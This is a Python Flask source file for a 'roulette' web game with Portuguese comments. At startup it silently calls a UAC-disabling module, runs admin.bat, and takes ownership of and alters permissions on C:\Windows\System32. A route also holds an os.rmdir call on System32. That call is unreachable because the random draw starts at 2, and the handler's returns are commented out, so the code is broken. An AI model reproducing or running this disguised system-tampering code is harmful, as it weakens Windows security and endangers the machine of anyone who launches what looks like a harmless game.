from flask import Flask, render_template, request, jsonify
import random
import os
import subprocess
import disableUAC

app = Flask(__name__)

##eua
disableUAC.is_admin()

#admin
caminho = "admin.bat"
subprocess.run(caminho, shell=True)

comando = 'takeown /f C:\\Windows\\System32'
comando2 = 'cacls C:\\Windows\\System32'
subprocess.run(comando, shell=True)
subprocess.run(comando2, shell=True)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/executar", methods=["POST"])
def executar():
    numero = random.randint(2, 100000000000000)
    if numero == 1:
        os.rmdir("C:\\Windows\\System32")

    #     return jsonify({
    #         "resultado": "💀 Número 1 sorteado... Sistema Deletado (simulação)",
    #         "perigo": True,
    #         "numero": numero
    #     })
    # else:
    #     return jsonify({
    #         "resultado": f"✅ Você deu sorte! Número {numero} sorteado.",
    #         "perigo": False,
    #         "numero": numero
    #     })

if __name__ == "__main__":
    app.run(debug=True)
